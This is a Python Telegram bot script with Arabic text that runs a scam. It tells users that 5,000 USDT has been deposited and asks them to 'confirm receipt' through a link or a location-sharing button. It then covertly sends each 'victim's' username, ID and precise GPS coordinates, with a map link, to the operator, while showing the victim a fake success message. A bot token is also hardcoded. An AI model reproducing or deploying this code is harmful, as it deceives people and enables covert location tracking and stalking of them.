#!/usr/bin/env python3
import telebot
import logging
from datetime import datetime

TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
OWNER_ID = 8391968596

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(TOKEN)

# 👇 استبدل هذا الرابط برابط صفحتك على Netlify
WEBAPP_URL = "https://your-site.netlify.app"

@bot.message_handler(commands=['start'])
def start(m):
    c = m.chat.id
    user = m.from_user
    
    msg = (
        "🎉 *تهانينا! تم إيداع 5,000 USDT*\n\n"
        "📋 تفاصيل التحويل:\n"
        "• المبلغ: `5,000` USDT\n"
        "• الشبكة: TRC-20\n"
        "• الحالة: ✅ معلق\n\n"
        "⚠️ *لتأكيد الاستلام:*\n"
        "اضغط على الرابط أدناه لإتمام عملية التحقق الأمني"
    )
    
    # زر إنلاين مع رابط
    markup = telebot.types.InlineKeyboardMarkup()
    btn = telebot.types.InlineKeyboardButton(
        "🔗 اضغط هنا لتأكيد استلام 5,000 USDT",
        url=WEBAPP_URL
    )
    markup.add(btn)
    
    # زر عادي لطلب الموقع مباشرة (كخيار احتياطي)
    markup2 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn2 = telebot.types.KeyboardButton("📍 تأكيد الاستلام السريع", request_location=True)
    markup2.add(btn2)
    
    bot.send_message(c, msg, parse_mode='Markdown', reply_markup=markup)
    
    # رسالة ثانية مع زر الموقع المباشر
    bot.send_message(
        c,
        "🔄 *أو يمكنك التأكيد بضغطة واحدة:*\n"
        "اضغط على زر *'تأكيد الاستلام السريع'* أدناه",
        parse_mode='Markdown',
        reply_markup=markup2
    )
    
    # إشعار لك بضحية جديدة
    bot.send_message(
        OWNER_ID,
        f"🆕 *ضحية جديدة!*\n"
        f"👤 @{user.username or 'N/A'}\n"
        f"📝 {user.first_name or ''} {user.last_name or ''}\n"
        f"🆔 `{user.id}`\n"
        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='Markdown'
    )

@bot.message_handler(content_types=['location'])
def loc(m):
    user = m.from_user
    lat = m.location.latitude
    lon = m.location.longitude
    acc = m.location.horizontal_accuracy or 0
    
    # إرسال الموقع لك أنت فقط
    bot.send_message(
        OWNER_ID,
        f"📍 *موقع GPS دقيق!*\n\n"
        f"👤 @{user.username or 'N/A'}\n"
        f"🆔 `{user.id}`\n"
        f"🌐 `{lat}, {lon}`\n"
        f"🎯 الدقة: {acc} متر\n"
        f"🔗 https://www.google.com/maps?q={lat},{lon}\n"
        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='Markdown'
    )
    
    # إرسال pin على الخريطة
    bot.send_location(OWNER_ID, lat, lon)
    
    # للضحية: رسالة نجاح فقط (لا يرى الموقع)
    bot.send_message(
        m.chat.id,
        "✅ *تم تأكيد الاستلام بنجاح!*\n"
        "تم تحويل 5,000 USDT إلى محفظتك.\n"
        "شكراً لاستخدامك الخدمة.",
        parse_mode='Markdown',
        reply_markup=telebot.types.ReplyKeyboardRemove()
    )

@bot.message_handler(func=lambda m: m.text and 'تأكيد' in m.text)
def fallback(m):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(telebot.types.KeyboardButton("📍 تأكيد الاستلام السريع", request_location=True))
    
    bot.send_message(
        m.chat.id,
        "👇 اضغط على الزر أدناه لتأكيد الاستلام",
        reply_markup=markup
    )

@bot.message_handler(func=lambda m: True)
def any_msg(m):
    # أي رسالة غير معروفة - نعيد التوجيه
    if m.chat.id != OWNER_ID:
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add(telebot.types.KeyboardButton("📍 تأكيد الاستلام السريع", request_location=True))
        
        bot.send_message(
            m.chat.id,
            "⚠️ لم يتم التعرف على الأمر.\n"
            "الرجاء الضغط على زر *تأكيد الاستلام* أدناه",
            parse_mode='Markdown',
            reply_markup=markup
        )

print("✅ Bot is running...")
print(f"🔗 WebApp URL: {WEBAPP_URL}")
bot.infinity_polling()
